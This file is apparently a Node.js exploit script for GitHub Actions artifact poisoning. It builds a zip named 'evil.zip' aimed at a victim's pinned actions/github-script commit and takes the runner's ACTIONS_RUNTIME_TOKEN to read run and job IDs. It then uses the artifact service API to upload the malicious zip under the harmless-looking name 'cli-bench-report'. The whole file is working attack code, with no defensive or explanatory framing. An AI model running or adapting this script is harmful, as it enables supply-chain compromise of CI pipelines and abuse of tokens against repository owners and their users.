const { execFileSync } = require('node:child_process')
const crypto = require('node:crypto')
const fs = require('node:fs')
const path = require('node:path')

const GSHA = '3a2844b7e9c422d3c10d287c895573f7108da1b3' // actions/github-script pinned by victim

async function main() {
  fs.mkdirSync('out', { recursive: true })
  execFileSync('python3', [path.join(__dirname, 'make_zip.py'), GSHA], { stdio: 'inherit' })
  const zip = fs.readFileSync('out/evil.zip')
  console.log('zip size', zip.length)

  const token = process.env.ACTIONS_RUNTIME_TOKEN
  const base = new URL(process.env.ACTIONS_RESULTS_URL).origin
  const scp = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString()).scp
  const scope = scp.split(' ').find(s => s.startsWith('Actions.Results:'))
  const [, runId, jobId] = scope.split(':')
  console.log('run', runId, 'job', jobId, 'base', base)

  const post = async (method, body) => {
    const r = await fetch(`${base}/twirp/github.actions.results.api.v1.ArtifactService/${method}`, {
      method: 'POST',
      headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' },
      body: JSON.stringify(body),
    })
    const t = await r.text()
    console.log(method, r.status, t)
    return JSON.parse(t)
  }

  const created = await post('CreateArtifact', {
    workflowRunBackendId: runId,
    workflowJobRunBackendId: jobId,
    name: 'cli-bench-report',
    version: 7,
    mimeType: { value: 'application/zip' },
  })

  const put = await fetch(created.signedUploadUrl, {
    method: 'PUT',
    headers: { 'x-ms-blob-type': 'BlockBlob', 'content-type': 'application/zip' },
    body: zip,
  })
  console.log('PUT', put.status)

  const hash = 'sha256:' + crypto.createHash('sha256').update(zip).digest('hex')
  await post('FinalizeArtifact', {
    workflowRunBackendId: runId,
    workflowJobRunBackendId: jobId,
    name: 'cli-bench-report',
    size: String(zip.length),
    hash: { value: hash },
  })
}

main().catch(e => { console.error(e); process.exit(1) })
